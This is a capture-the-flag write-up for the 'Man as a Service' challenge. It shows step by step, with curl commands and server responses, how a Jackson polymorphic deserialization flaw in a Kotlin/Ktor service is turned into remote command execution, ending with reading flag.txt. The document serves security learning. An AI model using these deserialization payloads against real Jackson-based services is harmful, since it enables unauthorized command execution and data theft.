# Man as a Service
Here you are greeted with three buttons. Each button will send a XHR request to http://manasaservice.tghack.no:1337/execute
with the payload
```json
{"command":{"@class":"no.tghack.ManManCommand"}}
```
Looking at the response headers you can also see this is a Ktor server, so its an Kotlin + JVM application.

## Trying to exploit 
The command takes in a field @Class which is a full class name with a package. Lets try to see if we can create
instances of Java classes
```bash
$ curl -H "Accept: application/json" -H "Content-Type: application/json" --data '{"command":{"@class":"java.lang.Object"}}' http://manasaservice.tghack.no:1337/execute
Could not resolve type id 'java.lang.Object' as a subtype of `no.tghack.Command`: Not a subtype
 at [Source: (InputStreamReader); line: 1, column: 22] (through reference chain: no.tghack.CommandRequest["command"])
```
Ok from this error we can extract two things. googling the error should tell us that this application is using Jackson.
Also it tells us that the class used in the command field has to be a subtype of `no.tghack.Command`, although it might
be an abstract class or interface. Lets try to create a instace of the `Command` class anyway.
```bash
$ curl -H "Accept: application/json" -H "Content-Type: application/json" --data '{"command":{"@class":"no.tghack.Command"}}' http://manasaservice.tghack.no:1337/execute
Cannot deserialize instance of `[Ljava.lang.String;` out of END_OBJECT token
 at [Source: (InputStreamReader); line: 1, column: 41] (through reference chain: no.tghack.CommandRequest["command"])
```

Okay now we know that Command is a fully-blown class, looking at
`Cannot deserialize instance of ``[Ljava.lang.String;`` out of` we can also see that it tries to deserialize an object
as a `String` array. Which means that `Command` has a constructor which accepts a `String` array. Maybe this is an array
of command arguments? Lets try:
``` bash
$ curl -H "Accept: application/json" -H "Content-Type: application/json" --data '{"command":["no.tghack.Command",["ls"]]}' http://manasaservice.tghack.no:1337/execute
{"command":{"@class":"no.tghack.Command","result":"bin\ndev\netc\nflag.txt\nhome\njson-gadget-all.jar\nkctf\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nstatic\nsys\ntmp\nusr\nvar\n"}}
```

What is happening here? So Jackson has a way of creating a class instance from an JSON array containing first the class
then all the main argument for the constructor. Since the main argument of this class is an `String` array we can pass
`["ls"]` as the constructor parameters. In the result we can also see the file listing containing a file called
`flag.txt`. Lets try to get it.

```bash
$ curl -H "Accept: application/json" -H "Content-Type: application/json" --data '{"command":["no.tghack.Command",["cat", "flag.txt"]]}' http://manasaservice.tghack.no:1337/execute
{"command":{"@class":"no.tghack.Command","result":"TG21{...}\n"}}
```
